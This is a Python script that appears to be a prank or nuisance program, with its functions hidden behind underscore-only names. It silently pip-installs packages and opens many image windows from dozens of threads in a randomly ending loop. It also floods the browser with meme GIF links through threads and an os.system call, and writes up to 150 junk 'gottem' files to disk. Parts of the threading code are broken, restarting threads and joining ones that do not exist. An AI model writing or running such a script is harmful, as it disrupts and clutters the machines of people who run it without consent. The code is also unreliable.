import sys
import subprocess
from random import randint, choice, shuffle
import threading
import os

img_links = ["./images/pg1.jpg", "./images/pg2.jpg", "./images/pg3.jpg", "./images/pg4.jpg", "./images/pg5.jpg", "./images/pg6.jpg", "./images/pg7.jpg", "./images/pg8.jpg", "./images/pg10.jpg", "./images/pg11.jpg",
             "./images/pg12.png", "./images/pg13.jpg", "./images/pg14.jpg", "./images/pg15.jpg", "./images/pg16.jpg", "./images/pg17.png", "./images/pg18.jpg", "./images/pg19.png", "./images/pg20.jpg", "./images/pg21.jpg", "./images/pg22.jpg", "./images/pg23.jpg", './images/wg1.webp', './images/wg2.webp']

gif_links = ['https://media.tenor.com/mlXMn16CKBkAAAAd/monkeslide-monke-slide-monkey-slide-monkey-ooo-oo-aaaa-aaa-monkey-slide.gif',
             'https://media.tenor.com/53YyA_P1GbEAAAAC/bruh-mario.gif', 'https://y.yarn.co/653c8da0-a2bf-450b-b823-3124dec9dc9d_text.gif', 'https://64.media.tumblr.com/ce85852b1c6b9c9754dc80b5a5cf8b1e/6d7d471a067418b1-da/s540x810/a0204c3b6bbb08f74728f97a7cab18501a52a40b.gif', 'https://tenor.com/view/vijay-sethupathi-makka-kalanguthappa-dharmadurai-gif-25156748', 'https://media.tenor.com/O-zccGfxhZsAAAAC/yum-treat.gif', 'https://media.tenor.com/aiCRC2dwZloAAAAC/vijay-sethupathi-makka-kalanguthappa.gif', 'https://media.discordapp.net/attachments/1059982253272354858/1059989960905732168/POKING.gif', 'https://media.tenor.com/DRd36YfJrnAAAAAi/pog-pog-champ.gif',
             'https://media.tenor.com/0SxdB5qr2z0AAAAC/dedede-really.gif', 'https://media.tenor.com/3tabU2V6wcoAAAAd/456-squid-game.gif']


def _():
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', 'playsound'])
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', 'Pillow'])
    subprocess.check_call(
        [sys.executable, '-m', 'pip', 'install', 'pyglet'])


def __():
    from playsound import playsound
    playsound('./a.mp3')


def ___():
    from PIL import Image
    from PIL import GifImagePlugin
    rand_img_path = choice(img_links)
    img = Image.open(rand_img_path)
    img.show()


def ____():
    threads = []
    x = 2
    while x % 9 != 0:
        for i in range(50):
            threads.append(threading.Thread(target=___))
        for each_thread in threads:
            each_thread.start()
        x = randint(0, 1000)
        for i in range(50):
            threads[i].join()


def _____():
    from PIL import Image
    from urllib.request import urlopen
    import webbrowser

    webbrowser.open(choice(gif_links))

    try:
        os.system("open /Applications/Safari.app {}".format(gif_links[0]))
    except Exception:
        pass


def ______():
    threads = []
    for i in range(5):
        threads.append(threading.Thread(target=_____))
    for each_thread in threads:
        each_thread.start()
    for i in range(10):
        threads[i].join()


def _______():
    name = ["g", "o", "t", "t", "e", "m"]
    shuffle(name)
    try:
        os.mkdir("./a")
    except Exception:
        pass
    for i in range(randint(75, 150)):
        with open("./a/{}{}.txt".format(''.join(name), i), "w+") as f:
            f.write("gottem" * (i + randint(1, 100)) * randint(50, 150))
